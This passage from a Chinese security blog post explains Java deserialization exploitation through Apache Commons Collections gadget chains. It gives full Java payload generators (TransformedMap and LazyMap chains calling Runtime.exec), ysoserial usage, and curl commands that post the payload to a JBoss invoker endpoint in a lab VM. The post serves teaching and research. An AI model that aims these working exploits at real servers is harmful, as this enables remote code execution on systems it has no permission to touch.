class="line">						<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line">				<span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">				<span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;),</span><br><span class="line">		&#125;;</span><br><span class="line">		Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">		Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">		innermap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">		Map outermap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">		Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">		Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">		ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">		<span class="comment">//返回"sun.reflect.annotation.AnnotationInvocationHandler"对象</span></span><br><span class="line">		Object instance = ctor.newInstance(Retention.class, outermap);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">		ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">		out.writeObject(instance);</span><br><span class="line">		out.flush();</span><br><span class="line">		out.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">		Object o=in.readObject();</span><br><span class="line">		in.close();</span><br><span class="line">        payloadTest();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 这里为测试上面的tansform是否会触发payload</span></span><br><span class="line">		<span class="comment">// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();</span></span><br><span class="line">		<span class="comment">// onlyElement.setValue("foobar");</span></span><br><span class="line"></span><br><span class="line">		ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">		in.readObject();</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行代码，得到反序列化文件<code>payload.ser</code>。</p>
+<h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><p>下面找一个不安全的反序列化入口吧，一般Java的RMI（远程方法调用）或是其他服务都不免用到反序列化。在org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)就存在一个不安全的反序列化入口：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546160655463.png" alt="1546160655463"></p>
+<p>在JBoss网站<a href="http://jbossas.jboss.org/downloads/上下载一个存在漏洞的jboss（以版本6.1为例），在虚拟机中安装一个低版本的java（8u66)，再运行jboss" target="_blank" rel="noopener">http://jbossas.jboss.org/downloads/上下载一个存在漏洞的jboss（以版本6.1为例），在虚拟机中安装一个低版本的java（8u66)，再运行jboss</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\anemone\Desktop\jboss-<span class="number">6.1</span>.<span class="number">0</span>.Final\bin&gt; ./run.bat -b <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546173400906.png" alt="1546173400906"></p>
+<p>接着尝试触发Payload，这里假设server地址为192.168.80.141：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">λ curl http://192.168.80.141:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546172924442.png" alt="1546172924442"></p>
+<p>可以看到计算器被弹出。</p>
+<h1 id="面向属性编程——POP"><a href="#面向属性编程——POP" class="headerlink" title="面向属性编程——POP"></a>面向属性编程——POP</h1><p>它类似于ROP（面向返回编程），搞PWN的都知道为了绕过堆栈不可执行往往会利用一些程序中已有的代码片段（gadgets)，将这些片段拼凑起来形成gadgets chain完成功能。</p>
+<p>POP 的gadgets chain寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。以前面讲到的POC来说，构造的POP gadgats链为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">        AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">            TransformedMap.checkSetValue()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>
+<h1 id="CommonsCollections6-amp-LazyMap"><a href="#CommonsCollections6-amp-LazyMap" class="headerlink" title="CommonsCollections6 &amp; LazyMap"></a>CommonsCollections6 &amp; LazyMap</h1><p>java的高版本（8u151+）修改了AnnotationInvocationHandler，导致我们的POP链失效，这时我们就要寻找新的POP，不过原理都是一样的。</p>
+<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>这里我们使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>工具的CommonsCollections6 POP链生成Payload，可以exploit。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ java -jar ysoserial.jar CommonsCollections6 <span class="string">"calc"</span> &gt; payload.ser</span><br><span class="line">λ curl http://127.0.0.1:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>可以看到序列化对象的Payload为CommonsCollections6.java，改写一下变成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadLazyMap</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">				<span class="comment">// Runtime</span></span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="comment">// (Method)Runtime.class.getMethod("getRuntime", null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line">				<span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line">				<span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">				<span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;),</span><br><span class="line">		&#125;;</span><br><span class="line">		Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">		TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">		HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">		hashSet.add(<span class="string">"nonce"</span>);</span><br><span class="line">		Field hashSetMapField = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			hashSetMapField = HashSet.class.getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">			hashSetMapField = HashSet.class.getDeclaredField(<span class="string">"backingMap"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hashSetMapField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">		HashMap innerHashMap = (HashMap) hashSetMapField.get(hashSet);</span><br><span class="line"></span><br><span class="line">		Field hashMapTableField = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			hashMapTableField = HashMap.class.getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">			hashMapTableField = HashMap.class.getDeclaredField(<span class="string">"elementData"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		hashMapTableField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">		Object[] array = (Object[]) hashMapTableField.get(innerHashMap);</span><br><span class="line">		Object node = array[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">			node = array[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Field keyField = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">			keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">		keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">		ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">		out.writeObject(hashSet);</span><br><span class="line">		out.flush();</span><br><span class="line">		out.close();</span><br><span class="line"></span><br><span class="line">         payloadTest();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">		in.readObject();</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化后弹出计算器，说明我们POP构造成功</p>
+<h2 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h2><p>它的POP链为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>先看HashSet:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class">	<span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> </span></span><br><span class="line"><span class="function">    	<span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    	        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT); <span class="comment">//Notice this</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它内部存在一个HashMap，因为HashSet本身的实现原理就是利用HashMap，在新元素e加入Set时，实际上在HashMap中保存<hash(e), e>。</hash(e),></p>
+<p>在反序列化的时候，同样也会将对象加入这个HashMap，我们需要利用的就是<code>map.put(e, PRESENT)</code>这句话，在调试时，可以看到e对象是一个TiedMapEntry对象，key=foo，value=ProcessImpl：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224558228.png" alt="1546224558228"></p>
+<p>key很好理解，但是value为什么是ProcessImpl？这还要再向下看：</p>
+<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap.put()调用了hash方法：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224687897.png" alt="1546224687897"></p>
+<p>hash方法调用了key.hashCode()方法，根据Gadgets链可以猜测我们的key.hashCode()实际上是TiedMapEntry.hashCode()：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546225603303.png" alt="1546225603303"></p>
+<h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><p>继续跟进，就到了TiedMapEntry的hashCode()方法了，简单介绍一下TiedMapEntry，它继承了普通的Entity类（就是高级for循环用到的那个），其构造方法是<code>TiedMapEntry(Map&lt;K,V&gt; map, K key)</code>。</p>
+<p>这里需要利用它的hashCode()方法：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226115263.png" alt="1546226115263"></p>
+<p>以及其调用的getValue()方法，可以看到它实际调用的是LazyMap.get()方法：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226273203.png" alt="1546226273203"></p>
+<h3 id="org-apache-commons-collections-keyvalue-LazyMap"><a href="#org-apache-commons-collections-keyvalue-LazyMap" class="headerlink" title="org.apache.commons.collections.keyvalue.LazyMap"></a>org.apache.commons.collections.keyvalue.LazyMap</h3><p>终于！！！我们到了链的最底端，LazyMap.get()，LazyMap基于Map，Map一开始不放元素，只有在get()时才会通过之前定义的factory添加元素（这里的factory可以使Transformer类型）。我的断点没办法在序列化时捕捉if里面的语句，好像是因为调试器会在调试语句前执行该语句的原因，不过这个在先前文章(<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">Commons Collections Java反序列化漏洞深入分析</a>)都介绍过，这里写一个demo模拟一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMapDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        		<span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">				<span class="comment">// Runtime</span></span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="comment">// (Method)Runtime.class.getMethod("getRuntime", null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line">				<span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line">				<span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">				<span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;),</span><br><span class="line">		&#125;;</span><br><span class="line">		Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">		lazyMap.get(<span class="string">'a'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546227538067.png" alt="1546227538067"></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">Commons Collections Java反序列化漏洞深入分析</a></li>
+<li><a href="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" title="JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用" target="_blank" rel="noopener">JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用</a></li>
+<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/Java/" rel="tag"># Java</a>
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+            
+               <div id="needsharebutton-postbottom">
+                 <span class="btn">
+                    <i class="fa fa-share-alt" aria-hidden="true"></i>
+                 </span>
+               </div>
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/反序列化-Java反序列化基本原理/" rel="next" title="Java反序列化1：基础">
+                <i class="fa fa-chevron-left"></i> Java反序列化1：基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/反序列化-Struts2-052反序列化漏洞分析/" rel="prev" title="Java反序列化3：Struts2-052反序列化漏洞分析">
+                Java反序列化3：Struts2-052反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div id="gitalk-container">
+    </div>
+    
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Anemone">
+            
+              <p class="site-author-name" itemprop="name">Anemone</p>
+              <p class="site-description motion-element" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">41</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
